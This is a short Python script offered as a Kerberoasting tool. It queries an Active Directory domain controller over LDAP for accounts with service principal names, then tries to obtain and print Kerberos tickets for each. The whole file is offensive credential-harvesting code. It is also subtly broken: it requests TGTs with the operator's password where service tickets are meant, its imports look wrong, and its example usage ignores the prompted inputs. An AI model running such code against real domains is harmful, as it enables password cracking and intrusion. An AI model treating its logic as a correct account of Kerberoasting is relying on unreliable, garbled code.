from impacket.krb5 import getKerberosTGT, KerberosError
from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES

def find_kerberoastable_users(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        server = Server(dc_ip)
        conn = Connection(server, user=f"{domain}\\{username}", password=password)
        conn.bind()

        # Search for kerberoastable users (users with SPNs set)
        conn.search(search_base='DC=' + ',DC='.join(domain.split('.')),
                     search_filter='(&(objectCategory=user)(servicePrincipalName=*))',
                     search_scope=SUBTREE,
                     attributes=[ALL_ATTRIBUTES])

        kerberoastable_users = [entry['sAMAccountName'].value for entry in conn.entries]

        conn.unbind()

        return kerberoastable_users

    except Exception as e:
        print(f"Error while searching for kerberoastable users: {e}")
        return []

def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
    try:
        # Find all kerberoastable users
        kerberoastable_users = find_kerberoastable_users(username, password, domain, dc_ip)

        if not kerberoastable_users:
            print("No kerberoastable users found.")
            return

        # Perform Kerberoasting for each kerberoastable user
        for user in kerberoastable_users:
            print(f"Kerberoasting user: {user}")

            # Perform Kerberoasting for the user
            tgt = getKerberosTGT(user, password, domain)

            # Output the obtained TGT
            print(f"Kerberoast ticket for user {user}:\n{tgt}\n")

    except KerberosError as ke:
        print(f"Kerberos error during Kerberoasting: {ke}")
    except Exception as e:
        print(f"Error during Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")


# Example usage:
username = input("Enter username: ")
# usernameWithDomain = input("Enter your username in this format: DOMAIN/username")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")